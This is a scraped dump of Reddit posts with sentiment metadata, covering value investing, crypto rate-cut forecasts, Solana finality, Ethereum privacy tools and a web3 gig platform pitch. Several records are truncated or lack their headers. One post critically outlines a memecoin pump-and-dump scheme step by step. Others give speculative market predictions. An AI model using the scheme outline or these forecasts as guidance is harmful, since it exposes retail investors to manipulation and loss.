"acquisition"], "crawled_at": "2025-10-03T13:57:08.420697", "sentiment_score": {"vader_compound": 0.9653, "vader_positive": 0.102, "vader_neutral": 0.84, "vader_negative": 0.057, "textblob_polarity": 0.04404761904761904, "textblob_subjectivity": 0.5019841269841271, "overall_sentiment": "positive"}},

{"post_id": "1nw21pg", "title": "Rubrik (RBRK): The Next Big Thing in Cyber AI", "content": "Rubrik (RBRK) is a high-growth, high-upside play on cyber AI.\n\nThe company provides data security and backup software that protects and restores critical business information. Its platform takes frequent, immutable snapshots of data so organizations can recover quickly from cyberattacks or outages. Think of it as a safety net across on-prem, cloud, and SaaS environments. Rubrik also organizes metadata about what data exists, where it lives, and who accessed it — helping customers comply with regulations and insurance requirements. The business model blends subscriptions and support, with a growing emphasis on software and cloud services.\n\nAI expands the attack surface by spreading data across vector databases, SaaS tools, and model-training pipelines. Rubrik’s edge is not just preventing damage but enabling fast recovery when things break. As more teams deploy AI agents and new data stores, backups must be frequent, tamper-resistant, and easy to restore. Rubrik’s automation and policy-driven controls standardize resilience across hybrid IT. Its platform can also surface unusual activity and guide remediation, reducing costly downtime. In an era of strict regulation and board-level cyber scrutiny, data resilience becomes essential infrastructure for AI adoption.\n\nRubrik has built a data graph—rich metadata on backups, versions, and relationships—that improves visibility and accelerates recovery. Immutable backups raise the bar against ransomware, a top risk for AI-heavy organizations. Deep integrations with major clouds, enterprise apps, and security platforms create stickiness and reduce complexity. Over time, telemetry from thousands of environments becomes a learning advantage for detection and response. Compliance mandates make consistent backup and recovery a requirement, not an option—supporting Rubrik’s durability at the recovery layer, where budgets remain resilient even in downturns.\n\nAs AI accelerates data creation, enterprises will spend more to protect it, favoring platforms that collapse multiple tools into one workflow. Rubrik can expand wallet share by covering more workloads and increasing backup frequency within its customer base. AI-first startups and modernized IT estates create new growth avenues. A shift toward software- and cloud-delivered services should lift margins, while cross-selling security analytics on top of backup deepens engagement. With cyberattacks frequently in the headlines, recovery-focused platforms stand to benefit from urgency and board-level attention. We see Rubrik as a ~25% revenue grower with potential for &gt;50% compounded EBITDA growth as margins expand.\n\nOver the next year, watch for large enterprise wins, public-sector contracts, and deeper partnerships with major cloud providers. Product launches that extend coverage to AI data stores or improve automated recovery would be notable. Tighter cyber-insurance standards could indirectly boost adoption. Migration tools for legacy backup replacements may accelerate competitive takeaways, while alliances with incident-response firms or SIEM/SOAR vendors would broaden reach.

(I don't agree with growth vs. value being a binary split, because growth is obviously a component of value). The market today isn't filled with net-nets (there are some), cigar butts, and stocks that trade at a discount to book or replacement/sale value. Those that do are often hard to find, messy and difficult to analyze. So you need to have a view on the future and growth prospects (it's not just pure speculation as Graham said so I don't wanna hear that).\n\nI think most stock pickers are better off focusing on strong businesses that are growing and having more flexibility on P/E ratios rather than trying to find \"value\" based on stocks that have tanked recently. A large portion of this sub loves low P/E stocks or those down 30+% and overlook fundamental challenges simply because the stock went down and now it appears \"value.\" You can put whatever stock du jour is the most talked about in this sub in that category most of the time... occasionally popular stocks here bounce back strongly, but I'm inclined to believe that may be more luck than skill... unless someone has a mention tracker going for testing... \n\nThose same folks look down on all the higher multiple stocks that the market loves that are strong and growing businesses. **I am not talking about the highest multiple or meme/hype stocks**, just quality businesses that people know and are most likely going to experience future success but trade at multiples around the broader market or \\~25% premiums. There are so many commenters here that overlook quality and hate a company that's trading at or near all time highs and think they're smarter than the market. They also think they're smarter than the market after a recent drop and think that recent \"cheapness\" equates to value. **You hate that people buy stocks just because they went up, but do the exact same thing and buy stocks just because they went down**. Momentum is a powerful force especially with trading volumes mostly driven by passive and levered pod shops. You're fighting against that when you buy a recently tanked stocks, at least those picking \"obvious\" businesses have those as tailwinds. \n\nI think most people would be better off investing in \"obvious\" strong, growing companies even if everyone else loves them rather than focusing all their attention on things that have fallen and probably subjecting yourself to a lot of value traps. Great businesses have a tendency to surprise on the upside and their execution and I believe those going through issues and turnarounds have a tendency to surprise on the downside. This entire spiel I doubt many will read **does not apply to anyone who will take the time to deeply understand a business, it's economics, strength, and potential for the future** I just don't see a lot of that here (to be clear **I'm not claiming to have that ability either**...). \n\nIf you want to buy some single stocks, but aren't going to make a career out of it the \"obvious\" ones might be your friend. I'd rather be consensus and right than contrarian and wrong... buy stocks because the business is strong and it's a reasonable price, don't fall in love with only a lower price. If you're absolutely must call yourself a value investor so you can look down on others without actually putting in the work just buy Berkshire Hathaway and call it a day... \n\nAnyway, subscribe to my stock tips, buy quantum computing, Palantir, ASTS, and DJT.

Kroger was going to pay roughly $27 a share to buy ACI but it ultimately fell through for antitrust reasons. Kroger has a PE of 17 and EV / Sales of 0.4. Weis has a PE of 17 and EV / Sales of 0.3. \n\nKroger will likely have to pay Albertsons a break up fee of $600 million or roughly 6% of the stock price. Albertsons also has authorized a share repurchase program of up to $2 billion so roughly 20% of the stock. During the latest quarter they bought 14.2 million shares at $22 for a total of $314.8 million.

{"post_id": "1nwondf", "title": "Most Value Investors Under perform in the long run.", "content": "Hey All,\n\nI want to make it clear from the beginning, I am no one to criticize anyone else. I just want to express my humble opinion on value investing. Please take this in the best manner, i have no intention to come off as rude, arrogant or overall just a real annoying critique.\n\nI think most people read graham or maybe the new value investors don't because of shortened attention spans. Look what worked for graham was only true because the markets were wholly inefficient and he just applied common sense, buffets early partnerships made some changes and showed signs of the shift to quality but mainly went of graham principles. Munger changes that of course, and today i believe that is really the right way to go. Most value investors statistically underperform; they just get caught up in the whole cheap thing, which is just outdated, and is a lot harder to make greater returns on. Spin offs special situations such things are not really my cup of tea, my thoughts on quant in value investing is that if dcf and the rest of qaunt analysis were so great, anyone with a computer and some algorithms would be making great returns. the former is of course not true.\n\nWhat is true is finding high quality businesses with competitive advantages and barriers of entry that can be bought at a reasonable fair price. For this one must accumulate insanse amounts of knowledge to be ready when such a opportunity arises, they must research like Li Lu's famous timberland story, and 99% won't. I think that there is oppurtunity, just not for those looking for net - nets for the most part, its just a lot more difficult and the odds are not in your favour. The talks on microsoft and other big names are fine, but 20x earnings is not reasonable, and beyond tech stocks what are the real competitive advantages of LULU for example since thats trendy, i never see that. Maybe i am biased to Munger, but the numbers back him, the logic and common sense as well. \n\nJust my thoughts. \n\nAlso if one had a decent understanding of healthcare, they could have capitalized on UNH is crazy fall for absolutley no good reason, from short term earning dissapointemnts to a doj case that will take years, and the ceo stepping down, and a new appointed one that worked as a executuve previously?

Financial assets experience an initial surge in value before the underlying economy has fully assessed the viability of capital investments. This disconnection fuels the boom, leading to further capital misallocation into speculative ventures with minimal real demand or profit potential.\n\nEssentially, stocks rise and continue to rise due to the influence of the Federal Reserve. Wall Street exacerbates this situation through its marketing and pressure-selling tactics. After all, Wall Street’s primary revenue streams are securitization and trading. As the boom continues to grow and persist, Wall Street’s wealth increases accordingly.\n\nTherefore, professional investors, most hedge fund managers, financial gurus, social media promoters, and most “professionals” in finance are essentially opportunistic beneficiaries of easy money and loosened credit injections into the financial markets.\n\nFor instance, consider Warren Buffett’s case. In 1980, he was worth $500 million and was already one of the wealthiest individuals in the world. Back then, there were only 13 billionaires worldwide. Fast forward 40 years, and Warren Buffett’s net worth has skyrocketed to $150 billion, while the global number of billionaires has increased to 3,000. Simultaneously, the value of the dollar has declined by nearly 74% in the same period. This means that while savers have been impoverished, asset holders have experienced significant wealth effect.\n\nAnd you wonder why you can’t afford a home Millennial!!! (lol)\n\nThe value of Buffett’s wealth is not solely attributed to his exceptional stock-picking abilities but rather to his long-term investments in high-quality financial assets added and abetted by inflation.\n\n\nAll these financial metrics and accounting calculations are meaningless in an inflationary environment. However, accountants, CPAs, CFAs, academics, MBAs, and other investment experts need to earn a living, so they market their systems, books, newsletters, and other products to the public.\n\nEssentially, the entire investment industry is somewhat  a pyramid scheme built on easy money. The moment the Federal Reserve reduces its money supply, the entire system collapses quickly.\n\nFortunately for the Wall Street professionals and gamblers , the current neo-Keynesian academics at the helm of the Federal Reserve have no intention of ever cutting off the flow of money and credit. Therefore, the boom may continue and spread to other tokenized vehicles and investment schemes.\n\nThe good news is that you can simply buy and hold great businesses and forget about it. Cash is toxic!\n\nBy the way,\n\nBen Graham operated under a more sound financial system, similar to Natural Finance under the Gold Standard. Since 1971, the world has entered an era of inflation and a fiat financial system. Securities analysis and economic calculation cannot be conducted in the same way in both regimes. \n\n\n\n\n\n", "author": "orishasinc2", "subreddit": "ValueInvesting", "score": 0, "upvote_ratio": 0.35, "num_comments": 22, "created_utc": "2025-10-03T06:14:08", "url": "https://www.reddit.com/r/ValueInvesting/comments/1nwg9lu/securities_analysis_is_a_deluded_fallacy_under/", "permalink": "https://reddit.com/r/ValueInvesting/comments/1nwg9lu/securities_analysis_is_a_deluded_fallacy_under/", "is_self": true, "domain": "self.ValueInvesting", "tech_keywords": ["AI", "AR", "stock", "investment", "revenue", "profit", "valuation"], "crawled_at": "2025-10-03T13:57:08.492755", "sentiment_score": {"vader_compound": 0.9889, "vader_positive": 0.121, "vader_neutral": 0.847, "vader_negative": 0.032, "textblob_polarity": 0.12312072450248758, "textblob_subjectivity": 0.3915245202558634, "overall_sentiment": "positive"}},

{"post_id": "1nvxpyy", "title": "Rate Cuts Could Ignite Massive Rallies: Why Context Might Turn This Cycle Into Another 1995 Or 2019, According To Goldman Sachs", "content": "As she states and taking in count Goldman Sachs Global Investment Research data, when the Federal Reserve cuts interest rates, many investors instinctively assume that it is bullish for the stock and crypto market (me included when I forget about this). But reality is different, it is important in what context it happens and usually the context matters more than the cut itself.\n\nAccording to some historical data that shows the Goldman Sachs research, when the Fed reduces rates outside of a recession, the S&amp;P 500 (probably crypto too now) has historically delivered impressive results with gaining around 50% within two years of the first rate cut. This happens when inflation is cooling, growth remain stable and monetary policy is shifting from restrictive to supportive. Market understands these moves as a green light for risk assets (crypto).\n\nHowever the story changes dramatically when rate cuts happen during a recession. In those cases the S&amp;P 500 tends to fall, around 20%-30% because economic weakness overshadows the impact of lower borrowing costs. In this case COVID era cuts were an exception.\n\nIn summary\n\n* If the Fed cut because the economy is collapsing, risk assets suffer.\n* If the Fed cut because inflation is easing without a growth crisis, markets usually soar.\n\nCurrently the US economy is not in a recession and inflation continues to cool, meaning that this cycle could look more like 1995 or 2019 periods that brought us strong market rallies rather than painful downturns like in 2001 and 2008.\n\nRate cuts are powerful, but only in the right economic environment.\n\nSource:\n\n* Tweet: [https://x.com/techconcatalina/status/1973528164799267055](https://x.com/techconcatalina/status/1973528164799267055)", "author": "kirtash93", "subreddit": "cryptocurrency", "score": 29, "upvote_ratio": 0.75, "num_comments": 31, "created_utc": "2025-10-02T16:58:56", "url": "https://i.redd.it/y7gxecyfnnsf1.png", "permalink": "https://reddit.com/r/CryptoCurrency/comments/1nvxpyy/rate_cuts_could_ignite_massive_rallies_why/", "is_self": false, "domain": "i.redd.it", "tech_keywords": ["AI", "AR", "stock", "investment", "growth"], "crawled_at": "2025-10-03T13:57:08.553412", "sentiment_score": {"vader_compound": -0.4297, "vader_positive": 0.149, "vader_neutral": 0.692, "vader_negative": 0.16, "textblob_polarity": 0.1358906525573192, "textblob_subjectivity": 0.5408289241622576, "overall_sentiment": "negative"}},

{"post_id": "1nwmddc", "title": "If you started your own crypto project, how would you build real market value for your coin?", "content": "I’ve been kicking this idea around for a while: if you were to launch your own crypto project from scratch, what would you actually do to give the coin real market value and not just pump-and-dump hype?\n\nMost new coins seem to follow the same tired playbook: spin up a catchy name, throw together a whitepaper, raise some money, list on a few DEXes, hope for a pump on Twitter, and then watch interest fade after a few weeks. That’s obviously not sustainable. I’m curious about the people here who think about the long game.\n\nIf you were in charge, how would you approach it? Would you focus on:\n\nUtility: A lot of coins die because they don’t do anything useful. Would you design it around a specific problem, maybe payments, gaming, privacy, DeFi, or something entirely different?\n\nTokenomics: Would you prioritize fair distribution, low inflation, or something like a burn mechanism to control supply? Maybe staking rewards to keep holders engaged?\n\nLiquidity &amp; Listings: We all know exchange access matters. Would you try to get on every CEX you can early on, or focus on building liquidity pools on DeFi first?\n\nCommunity: Some projects live or die by their community. Would you prioritize building an engaged user base first, think memes, community voting, regular updates or do you think community only matters once there’s actual utility?\n\nPartnerships &amp; Real-World Use: This is where I see a lot of coins fall short. Beyond airdrops and influencer shilling, what about partnerships with businesses or apps where the coin could actually be used?\n\nMarketing vs. Building: The classic debate: do you spend early energy on marketing hype to get people in the door, or quietly build and launch with a working product before going loud?\n\nPersonally, I think too many projects skip over the fundamentals. Everyone wants a moonshot chart, but few want to do the boring work: sustainable tokenomics, real-world use cases, proper liquidity strategy, and a solid long-term plan for how the token integrates into whatever ecosystem you’re building.\n\nSo I’m throwing it out to the community: if you were given the chance to create a new crypto from zero, how would you try to make it valuable over the next 5+ years?\n\nWhat’s the first thing you’d focus on?\nWhat’s the mistake you’d avoid at all costs?\nAny unconventional tactics that you think could really move the needle?", "author": "flying_cactus", "subreddit": "cryptocurrency", "score": 0, "upvote_ratio": 0.43, "num_comments": 37, "created_utc": "2025-10-03T10:43:05", "url": "https://www.reddit.com/r/CryptoCurrency/comments/1nwmddc/if_you_started_your_own_crypto_project_how_would/", "permalink": "https://reddit.com/r/CryptoCurrency/comments/1nwmddc/if_you_started_your_own_crypto_project_how_would/", "is_self": true, "domain": "self.CryptoCurrency", "tech_keywords": ["AI", "AR"], "crawled_at": "2025-10-03T13:57:08.563954", "sentiment_score": {"vader_compound": 0.798, "vader_positive": 0.078, "vader_neutral": 0.876, "vader_negative": 0.046, "textblob_polarity": 0.05057239057239057, "textblob_subjectivity": 0.39413364413364416, "overall_sentiment": "positive"}},

We know what's coming.", "content": "This isn't financial advice or guidance; make your own decisions and do your own analysis.\n\nLast post:\n\n[https://old.reddit.com/r/CryptoCurrency/comments/1kkb15x/3rd\\_update\\_always\\_remember\\_we\\_aint\\_sheep\\_we\\_know/](https://old.reddit.com/r/CryptoCurrency/comments/1kkb15x/3rd_update_always_remember_we_aint_sheep_we_know/)\n\n**What happened since last post?**\n\n**1. No nuke.**\n\nWe made it past June and September with no meaningful sell.\n\n**2. 110k BTC**\n\n110k BTC has solidified even more as an important level which was noted to watch in the prior post. Could even say it's now a support level though it remains to be seen whether bulls can lift prices into meaningful new highs.\n\n**3. No new bull trend**\n\nIt previously seemed really unlikely crypto would enter a new bull trend. But we also didn't get much in the selloff area.\n\n**What to watch for going forward?**\n\n**1. 2026 Jan-Feb Nuke?**\n\nNext area to watch for a nuke. There's a reason nukes have happened so many times in these months in prior years, it has to do with very complicated stock market dynamics. Remember crypto is secondary to the stock market, it follows stocks and specifically tech. /NQ or Nasdaq futures is still a solid indicator to watch for this.\n\n**2. Economy hasn't improved, continues to get worse.**\n\nNo secret that things continue to worsen. Basically only upper middle class and above holding the economy together while lower classes are in a recession. Think you all know the numbers are bad and continue to trend downwards.\n\n**3. 2025 Q4**\n\nNo meaningful sell by this point often leads to a slow grind up into new years. Will we see new highs? Seems more likely than not. Particularly for stocks which should precipitate into crypto. Now will it be a new bull run with repeating new highs in short time periods? I'm skeptical of that but difficult to say either way. There is risk to the upside in stock markets, interest in higher numbers or rather a more bullish quarter is undervalued. This doesn't always precipitate into crypto however. Q4 2021 into Q1 2022 is a good reference for what I mean here. We got a pop early in that ending year quarter but it struggled after with BTC struggling heavily with early heavy sells.\n\nImportant item to reread from last post.\n\n&gt;Nonetheless for a bullish bet, you'd wanna watch for BTC to translate the 110k price level from a resistance level to a support level. Meaning BTC resists dropping below 110k, dips below are bought and price continues to higher highs. This would occur over weeks to months. A handful of breaks above 110k with retreats below isn't bullish, it's bearish. I personally am not betting on a new crypto bull run anytime soon.\n\n\n\nThis is still true as we move through 2025 Q4 into the new year. Failure to achieve new meaningful highs isn't a bullish sign. With the inverse, continued new highs is a bullish sign.\n\n2026 Jan and Feb is dangerous. Whatever happens during Q4 2025, be prepared for 2026.\n\nhttps://preview.redd.it/l8rsbql1ossf1.png?width=1762&amp;format=png&amp;auto=webp&amp;s=cbfca7e199ec0497546a3889fd5b84fbc619085b", "author": "Utah0001", "subreddit": "cryptocurrency", "score": 0, "upvote_ratio": 0.2, "num_comments": 7, "created_utc": "2025-10-03T10:05:53", "url": "https://www.reddit.com/r/CryptoCurrency/comments/1nwllv3/q4_2025_update_always_remember_we_aint_sheep_we/", "permalink": "https://reddit.com/r/CryptoCurrency/comments/1nwllv3/q4_2025_update_always_remember_we_aint_sheep_we/", "is_self": true, "domain": "self.CryptoCurrency", "tech_keywords": ["AI", "cryptocurrency", "AR", "stock"], "crawled_at": "2025-10-03T13:57:08.577131", "sentiment_score": {"vader_compound": -0.982, "vader_positive": 0.058, "vader_neutral": 0.836, "vader_negative": 0.105, "textblob_polarity": 0.03121091871091871, "textblob_subjectivity": 0.4516534391534391, "overall_sentiment": "negative"}},

{"post_id": "1nwa2ku", "title": "Are you laughing or just being rugged?", "content": "Memecoins… I know what you’re probably thinking when you read that word. And yes, most of your preconceptions are correct. A large portion of this industry, especially when you consider the capital involved, revolves around pump-and-dump schemes.\n\nIn fact, I recently came across more than one confession on Reddit from self-proclaimed pump-and-dump operators. From organized KOL gangs to small-time celebrities, and even highly technical individuals with automated toolkits — most of them operate on Solana. And the majority use the **Pump\\[dot\\]fun** platform.\n\nOne Reddit user in particular, u/JewelTamexJuno, caught my attention because of the level of detail he revealed during an AMA. He also seemed to have a thinly veiled agenda of selling his own toolkit, which he described as including:\n\n* Volume bot\n* X tracker\n* AI API with his own LLM\n* Private RPC (likely a rented dedicated node)\n* New trader alert bot\n* Sniper bot\n\nAs anyone familiar with web3 will notice, none of this is groundbreaking. Some tools are even free or easy to adapt. Others cost just a few dollars. With less than $100, anyone could piece together a similar setup, even without coding skills — with a bit of effort, of course.\n\nHe even outlined his script, which goes something like this:\n\n* X trackers monitor large accounts (e.g., Elon, Presidents, major CT figures).\n* An account tweets an image (for example, Elon Musk posting a Doge on the moon).\n* His bot detects the image and instantly creates a memecoin around it, with AI generating the name.\n* He buys a chunk of the supply and runs volume bots.\n* Retail traders jump in.\n* He dumps.\n\nHe also dropped this gem of his wisdom:\n\n“*Everyone knows that newly created coins based on trends can rug at any time, making it a race for manual traders.*”\n\nThis is a snapshot of how one individual can manipulate the system — not because he’s a genius, but because the entire environment makes it possible. Beyond individuals, I also saw mob-like operations involving KOLs running secret Telegram groups, coordinating manual pumps, and creating ponzi-like subgroup structures where insiders grabbed the biggest slice. Again, not sophisticated — just organized extraction.\n\nAnd let’s not even start with celebrities and nation-state presidents orchestrating their own pump-and-dumps. We’ve seen enough to understand that the **Solana ecosystem is saturated with mafia-style groups and bot armies**, all dressed up as “fun” memecoins.\n\nBut are people really having fun? Is there anything authentic to this narrative, or is it just another layer of extractive nonsense?\n\n\\[This is small part of my article \"[Are you laughing?](https://substack.com/home/post/p-175103381) [The way to have fun with memecoins like a builder](https://substack.com/inbox/post/175103381?r=23szg&amp;showWelcomeOnShare=true&amp;triedRedirect=true)\" just click the link if you want to read the full story and discover one or two new things, but i REALLY want to start a discussion here, it's not a engagement/subscriber farming post.

How to Build an Onchain Attribution System", "content": "[User acquisition](https://formo.so/acquisition) is one of the biggest problems in crypto. For an app to succeed, it must have **sustainable unit economics** when it comes to user acquisition. The lifetime revenue of a user (LTV) should be greater than the cost to acquire them (CAC) at a healthy multiple.\n\nTherefore, understanding how your [web3 marketing](https://formo.so/blog/web3-marketing-intelligence-a-guide-to-measuring-onchain-growth) efforts translate to onchain conversions, volume, and TVL is crucial for sustainable [growth](https://formo.so/blog/measuring-growth-in-web3-with-metrics-that-matter) onchain. Without accurate attribution, you are lost in the dark forest.\n\n[Onchain attribution](https://formo.so/blog/web3-attribution-and-analytics-onchain-growth-guide-for-web3-marketing-teams) connects user touchpoints across both Web2 and Web3 touchpoints. It tracks the complete user journey from initial discovery through final onchain conversion, using wallet addresses as persistent identifiers.\n\nWeb3 Attribution helps answer key questions:\n\n* Where did users come from?\n* What meaningful activity did users perform on my app?\n* How well are users monetizing? How much revenue did I make? (ARPU, LTV)\n* How long are users sticking around? (Retention, Churn)\n* Is my ROI for an acquisition channel positive? (LTV &gt; CAC)\n\nHowever, there are many challenges in getting attribution right. Web3 users use multiple wallets on multiple chains. Traditional analytics tools miss critical onchain actions. [Marketing campaigns](https://app.formo.so/teams/b7d64d22-04eb-474b-83bc-fe19acbbd2a7/projects/intro) span Twitter, Discord, websites, quest platforms, and smart contracts—all disconnected from each other. Most importantly, onchain data reveals what happened, but not the context behind why users took specific actions.\n\nThis comprehensive guide explores how to build effective Web3 attribution systems that deliver [measurable results](https://formo.so/blog/web3-growth-metrics-and-strategies-for-onchain-growth) for onchain apps and protocols.", "author": "yosriady", "subreddit": "ethereum", "score": 0, "upvote_ratio": 0.33, "num_comments": 1, "created_utc": "2025-10-03T18:49:28", "url": "https://formo.so/blog/what-is-web3-attribution-how-to-build-an-onchain-attribution-systemwhat-is-web3-attribution-how-to-build-an-onchain-attribution-system", "permalink": "https://reddit.com/r/ethereum/comments/1nwuqnk/what_is_web3_attribution_how_to_build_an_onchain/", "is_self": false, "domain": "formo.so", "tech_keywords": ["AI", "AR", "revenue", "growth", "acquisition"], "crawled_at": "2025-10-03T13:57:08.615966", "sentiment_score": {"vader_compound": 0.938, "vader_positive": 0.096, "vader_neutral": 0.873, "vader_negative": 0.031, "textblob_polarity": 0.15563973063973066, "textblob_subjectivity": 0.5113836780503448, "overall_sentiment": "positive"}},

I actually do appreciate some of the technical advancements Solana has made, I just personally think Solana is way more centralized than people realize and it should become an Ethereum L2 to properly guarantee property rights and give users the option to exit to a credibly neutral L1 chain like Ethereum. Anyway, I was listening to Anatoly at the All In Summit and he was mentioning Solana's goal is to achieve 150ms finality time, specifically using Starlink. I was looking at world wide ping times and they're closer to 250ms (though I understand that Starlink can be closer to 150ms because of low Earth orbit).\n\nWhat I am trying to understand, whether it's Solana or even an Ethereum L2, is it even possible to achieve 150ms global finality if you can't even communicate across the world that quickly? Even if you just used Starlink, which is a massive centralization choke point as you wouldn't be able to achieve 150ms through traditional fiber, and restricted yourself to top tier datacenters which is another choke point, is this even possible?

They aren’t. The new benchmark you need to start moving towards is that assets and transactions must go into privacy environments - AND STAY THERE.\n\nEvery time you move an asset into or out of a privacy environment, you’re essentially using it as a mixer, but those types of movements are increasingly easy to track using sophisticated analytical tools. They are far from perfect, but perfect isn’t required to figure with whom you are transacting. This picture, which I took at the TUM Blockchain in Munich shows how Chainalysis can track funds as they move through mixers and bridges. It’s a leaky process, but it works. And that’s just with criminals and fungible assets.\n\n[Chainalysis’ Reactor Tool Tracks Payments &amp; Transfers](https://preview.redd.it/xfoei20yi5qf1.jpg?width=4032&amp;format=pjpg&amp;auto=webp&amp;s=9901d1dbed21cc0e5ad1174cd2df11c6af17bd91)\n\nIf you’re a business and you deal in non-fungible assets or you do a lot of routine transactions with the same customers and suppliers, don’t think for one second that pattern won’t be discernible even faster. As a result, systems that operate a bit like mixers or that use ZK to conceal selected transfer data are not going to be effective for people who do anything more than routine transactions.\n\nTo maintain privacy, you need execute transactions inside the privacy environment. Networks like Aztec allow you to build complex business transactions with programmable logic inside the privacy environment.  Nightfall allows you to do payments, transfers, and swaps and, over the next year or so, we’ll be adding the ability to build complex, composable contracts that run entirely under privacy\n\nIn the early stages, if you value your privacy, you should reasonably expect to pay a bit more for private transactions. At least for Nightfall, the most expensive part of the transaction is actually the computing power required for the roll-up, not the gas fees. However, I’m optimistic that these costs will come down quickly. We’ve seen performance improvements on ZK computations of over 1,000x in the last few years. I expect that to continue.\n\nThe Nightfall test network on Plume is already up and running.  Expect to see announcements from EY and Plume on education programs and access to the test net shortly. \n\nBetween Nightfall, Aztec, COTI, and others, the privacy space is really heating up on Ethereum. I can’t deny that, as one of the proud parents of Nightfall, I want to see us win that race, but I’ll be happy no matter which option succeeds because first and foremost, I think sustainable, scalable privacy is critical to driving blockchain adoption at scale.\n\n\n\nPlume’s Nightfall Announcement:\n\n[https://blockchainreporter.net/plume-welcomes-privacy-l3-nightfall-to-advance-institutional-rwa-tokenization/](https://blockchainreporter.net/plume-welcomes-privacy-l3-nightfall-to-advance-institutional-rwa-tokenization/)\n\nNightfall’s GitHub Repo:\n\n[https://github.com/eyblockchain/](https://github.com/eyblockchain/)\n\nEY’s Blockchain Technology Page:\n\n[https://blockchain.ey.com/technology](https://blockchain.ey.com/technology)\n\n", "author": "pbrody", "subreddit": "ethereum", "score": 38, "upvote_ratio": 0.88, "num_comments": 7, "created_utc": "2025-09-20T01:54:11", "url": "https://www.reddit.com/r/ethereum/comments/1nl8y44/the_bar_for_privacy_is_going_up/", "permalink": "https://reddit.com/r/ethereum/comments/1nl8y44/the_bar_for_privacy_is_going_up/", "is_self": true, "domain": "self.ethereum", "tech_keywords": ["AI", "blockchain", "AR", "react"], "crawled_at": "2025-10-03T13:57:08.658761", "sentiment_score": {"vader_compound": 0.9962, "vader_positive": 0.137, "vader_neutral": 0.834, "vader_negative": 0.029, "textblob_polarity": 0.22560572502432966, "textblob_subjectivity": 0.4841773213866237, "overall_sentiment": "positive"}},

{"post_id": "1nfkjcw", "title": "Gig economy idea, needs work but the bones are there", "content": "Okay round 2.\n​The Drift: A New Economic Model for the Gig Economy\n\n​The gig economy was once hailed as the future of work, offering freedom and flexibility. However, it has evolved into a system where independent professionals face a series of systemic struggles that limit their potential and undermine their financial stability. The Drift is a decentralized web3 platform designed to address these core issues and empower a new generation of creators.\n\n​The Problem with the Current Gig Economy\n​The modern gig economy, facilitated by centralized corporate platforms, suffers from five critical flaws:\n\n​Exploitative Corporate Cuts: Corporations take a disproportionately large percentage of a worker’s earnings. Platforms are known to take commissions ranging from 10% to over 20%, which significantly reduces a professional’s take-home pay and stifles their ability to build wealth.\n\n​Inconsistent and Delayed Payouts: Freelancers face chronic issues with late or delayed payments. Reports show that a significant majority of freelancers have experienced late invoice payments, with many waiting days or even weeks to get paid for their work. This creates financial instability and hardship for gig workers.\n\n​Lack of True Ownership: Gig workers do not own their professional identities, portfolios, or work. The content they create is often subject to ambiguous work-for-hire clauses, and their entire online presence can be removed or censored at the discretion of a single platform.\n\n​Censorship and De-platforming: Centralized platforms act as a single point of control, giving them the power to arbitrarily de-platform a user or remove their content. This threat looms over creators, jeopardizing their reputation and ability to earn an income.\n\n​Difficulty Securing Work: The gig market is highly fragmented and often opaque. Professionals struggle to get paid what they are worth and find it difficult to secure consistent, high-value work and advertising gigs, as they must compete within the confines of a platform’s specific ecosystem.\n\n​The Solution: \n\nThe Drift's Decentralized Model:\n\n​The Drift is built on a decentralized, transparent, and user-governed framework that tackles these problems head-on. Our platform is designed to:\n\n​Eliminate Corporate Middlemen: By removing the central authority, The Drift is able to significantly reduce transaction costs, allowing creators to earn what they are truly worth. A small, transparent protocol fee is used to maintain the system, not to generate corporate profit.\n\n​Guarantee Secure and Timely Payouts: Smart contracts ensure that payments are released instantly and securely upon the completion of a gig, eliminating the issue of late or inconsistent payments. Funds are held in escrow on the blockchain, providing trust and transparency for both the creator and the client.\n\n​Empower User Governance: The platform is designed to be a Decentralized Autonomous Organization (DAO). The community of users and creators will have a direct say in key decisions and future developments, ensuring the platform always operates in their best interest.\n\n​The Role of the Resonance Token:\n\n​The Resonance token is not an unnecessary addition; it is the fundamental utility and governance layer of The Drift's ecosystem. It solves the critical challenge of a global, frictionless payment system.\n\n​Universal Medium of Exchange: The token acts as a universal currency for all transactions on the platform, bypassing the complexities, fees, and delays of international fiat-to-fiat conversions. It allows a creator in one country to seamlessly and instantly get paid by a client in another.\n\n​Fee Structure: The Resonance token is used to pay the protocol fees for transactions and services on the platform. This fee goes back into the system to reward users and maintain the network, rather than into a corporate treasury.\n\n​Governance: Holding Resonance tokens gives users the power to vote on proposals, including platform upgrades, fee changes, and other key decisions. This fulfills our mission of building a system \"run by a government of the people.\"\n\n​The Creator Payout Model: \n\nAligned Incentives:\n​This model was designed with one primary goal in mind: to build unwavering trust from a highly skeptical community. We understand that in the current web3 landscape, the immediate assumption about any new token is that it's a vehicle for the creators to get rich quickly. This model is a direct rebuttal to that assumption.\n\n​The Thinking Behind the Payout Model:\n\n​This model is a testament to our commitment to the platform's vision. It signals that this is not a short-term venture, but a labor of necessity. The creator's reward is directly tied to building something that is needed, not something that is speculative. This is a testament to our commitment to building a sustainable ecosystem for creators, not a speculative asset for ourselves.\n\n​The Creator's Payout:\n\n​The creator of the platform is not a pre-allocated token holder. Instead, their incentives are fully aligned with the platform’s long-term health and success. A small percentage of the total economic activity that takes place on the platform will be automatically disbursed to the creator's wallet.\n\n​No Pre-Allocation: \n\nThe creator does not possess a large, unearned supply of the Resonance token. They cannot simply \"dump\" a token on the market.\n\n​Payouts via Smart Contract: \n\nThe commission is hard-coded into the platform's smart contract. This means the payout mechanism is public, transparent, and auditable by anyone in the community.\n\n​Rewarding Value, Not Creation: \nThe creator only gets paid when the platform is actively being used and generating value for its users. This ensures the creator is incentivized to continuously maintain, improve, and promote the platform, as their compensation is directly tied to its ongoing economic activity.\n\n​Technical Architecture:\n\n​The core functionality of The Drift is built on a decentralized technical stack, ensuring transparency, security, and immutability. Unlike a centralized platform with a private database, our architecture is open and auditable by anyone.\n\n​The Blockchain Backbone:\n\n​The Drift will operate on a public blockchain that supports robust smart contract functionality, such as Ethereum. To ensure efficiency and low transaction costs for users, it will be deployed on a Layer-2 scaling solution. This provides the security and decentralization of the main blockchain while offering the speed and affordability necessary for a high-volume platform.\n\n​Smart Contracts: \n\nThe Rules of the Game:\n\n​The core business logic of the platform is governed by a series of smart contracts. These are self-executing programs that run on the blockchain. They ensure that all transactions and agreements are tamper-proof and transparent. Key smart contracts will include:\n\n​Escrow Contract: \n\nFunds for a gig are held securely in a smart contract. Once both parties verify that the work is complete, the contract automatically releases the payment to the creator and sends a small protocol fee to the system. This eliminates the risk of non-payment.\n\n​Payment Contract: \n\nThis handles all fund transfers, including payouts to creators, client payments, and the distribution of 